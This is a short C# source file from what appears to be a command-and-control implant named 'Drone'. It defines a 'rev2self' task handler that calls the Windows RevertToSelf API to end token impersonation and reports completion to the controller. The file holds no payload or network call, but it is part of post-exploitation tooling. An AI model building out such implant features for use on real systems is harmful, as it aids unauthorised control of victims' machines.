using System.ComponentModel;
using System.Runtime.InteropServices;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Functions;

public class RevToSelf : DroneFunction
{
    public override string Name => "rev2self";
    
    public override void Execute(DroneTask task)
    {
        if (!Win32.RevertToSelf())
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        Drone.SendTaskComplete(task.TaskId);
    }
}